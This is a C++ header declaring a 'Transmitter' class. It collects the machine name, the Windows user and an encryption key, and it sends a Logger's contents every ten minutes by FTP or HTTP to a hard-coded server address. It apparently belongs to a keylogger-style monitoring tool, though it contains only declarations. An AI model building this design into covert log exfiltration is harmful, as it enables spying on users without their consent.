#pragma once

#include <SFML/System.hpp>
#include <SFML/Network.hpp>
#include "Logger.h"

using namespace std;
using namespace sf;

const Time TIME_TRANSMISSION = seconds(60*10); // Every 10 minutes
const string SERVER_ADDRESS = "192.168.10.200";
const int SERVER_PORT = 21;
const string WEB_PAGE = "/";



class Transmitter
{
	// Hold the transmitter status
	bool Transmitting;

	// Hold the machine name
	string Machine;

	// Hold the actual user connected to the machine
	string User;

	// Encription key
	string Key;

	// Pointer referring to the log
	Logger* Log;
	
	// Hold the last time a transmission was sent successfully
	string LastTransmission;

	// Timer keeping track of the elapsed time
	Clock Timer;

public:

	// Transmitter() : Constructor of the transmitter class
	Transmitter(Logger* logger);

	// Start() : Start sending log to server
	void Start();

	// Stop() : Stop the transmitter 
	void Stop();

	// Ftp()
	void ftp();

	// Http();
	void http();

	// IsTransmitting() : Return Transmitting value
	bool IsTransmitting() const;

	// GetMachine() : Return the machine name
	string GetMachine() const;
	
	// GetUser() : Return the window username
	string GetUser() const;

	// GetLastTransmission() : Return last time a transmission was done successfully 
	string GetLastTransmission() const;

	// GetKey() : Return the encryption key
	string GetKey() const;

	// SetKey(string) : Assign a value to the Key attribut
	void SetKey(string key);
};
